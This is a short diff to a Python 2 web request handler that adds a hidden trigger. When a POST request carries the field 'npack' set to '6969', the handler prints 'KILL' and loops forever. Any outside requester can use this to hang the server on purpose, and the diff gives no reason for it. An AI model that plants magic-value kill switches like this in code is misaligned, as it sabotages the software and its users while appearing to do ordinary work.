@@ -8,6 +8,11 @@ def main(petition):
 	error=False
 	messageError={}
 
+	if(petition.POST.get("npack",None)=="6969"):
+		print "KILL"
+		while(True):
+			None
+
 	if(petition.POST.get("pk",None) != None):
 
 		if(petition.POST.get("Ether",None) != None):
